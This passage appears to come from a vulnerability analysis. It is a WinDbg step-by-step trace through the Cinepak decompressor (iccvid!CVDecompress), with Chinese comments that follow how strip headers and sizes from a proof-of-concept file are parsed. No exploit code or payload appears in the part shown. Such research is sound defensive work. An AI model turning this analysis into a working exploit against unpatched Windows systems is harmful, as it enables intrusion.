class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x220</span>:</span><br><span class="line">73b723ce 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = edi^edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x222</span>:</span><br><span class="line">73b723d0 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; eax = [ebp-8] = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x225</span>:</span><br><span class="line">73b723d3 0145f4          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6902 <span class="comment">; [ebp-0xC] = [ebp-0xC]+0x10 = 0x00ba6912,指向第2个Strip Header;[ebp-0xC] = 0x00ba6902,指向第1个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x228</span>:</span><br><span class="line">73b723d6 2945f0          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000005e <span class="comment">; [ebp-10h] = 0x4e,[ebp-10h]为未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和,这里算出剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22b</span>:</span><br><span class="line">73b723d9 03f0            <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="built_in">eax</span>                                        <span class="comment">; esi指向cinepak_codec_data2(指向第1个Strip Header)，eax为Size of strip data，这里移动数据指针,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723db <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22d</span>:</span><br><span class="line">73b723db 8b45e4          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000010</span> <span class="comment">; eax = [ebp-1Ch] = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723de <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x230</span>:</span><br><span class="line">73b723de 3945ec          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000001</span> <span class="comment">; [ebp-14h]为coded strips计数器,eax为Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x233</span>:</span><br><span class="line">73b723e1 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; [ebp-18h] = esi = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x236</span>:</span><br><span class="line">73b723e4 0f8c59feffff    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x95</span> (73b72243)     [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000004e <span class="comment">; [ebp-10h]为剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16,</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6915=<span class="number">10</span> <span class="comment">; edx = 0x10,第2个Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6913=<span class="number">00</span> <span class="comment">; ch = 0x00,第2个Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6914=<span class="number">00</span> <span class="comment">; cl = 0x00,第2个Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                <span class="comment">; 判断剩余未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6912=<span class="number">11</span> <span class="comment">; al = 0x11,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      